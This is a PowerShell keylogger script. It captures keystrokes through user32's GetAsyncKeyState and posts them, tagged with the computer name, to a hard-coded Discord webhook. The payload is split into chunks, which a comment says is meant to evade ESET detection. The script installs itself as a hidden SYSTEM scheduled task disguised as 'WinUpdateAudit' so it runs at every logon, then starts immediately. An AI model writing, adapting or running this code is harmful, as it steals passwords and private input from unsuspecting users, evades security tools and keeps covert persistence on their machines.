# Configuration
$U = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX"
$T = "WinUpdateAudit"
$P = "$env:LOCALAPPDATA\win_audit.ps1"

# Obfuscated chunks to evade ESET signatures
$s1 = "Add-Type -Type 'using System;using System.Runtime.InteropServices;public class K{[DllImport("
$s2 = '"user32.dll")]public static extern short GetAsyncKeyState(int v);}'
$s3 = "';"
$s4 = "while(`$true){Start-Sleep -m 50;for(`$i=8;`$i -le 190;`$i++){if([K]::GetAsyncKeyState(`$i) -eq -32767){"
$s5 = "`$L += [char]`$i;if(`$L.Length -ge 30){Invoke-RestMethod -Uri '$U' -Method Post -Body (@{username=`$env:COMPUTERNAME;content=`$L}|ConvertTo-Json) -ContentType 'application/json';`$L=''}}}}"

$FullLogic = $s1 + $s2 + $s3 + $s4 + $s5

if (-not (Test-Path $P)) {
    $FullLogic | Out-File -FilePath $P -Encoding ascii -Force
    # Create a stealthy scheduled task for persistence instead of Registry
    $A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-W H -Exec Bypass -File `"$P`""
    $Tr = New-ScheduledTaskTrigger -AtLogOn
    $Pr = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $T -Action $A -Trigger $Tr -Principal $Pr -Force
}

# Fire immediately
Start-Process powershell.exe -ArgumentList "-W H -NoP -Exec Bypass -File `"$P`"" -WindowStyle Hidden
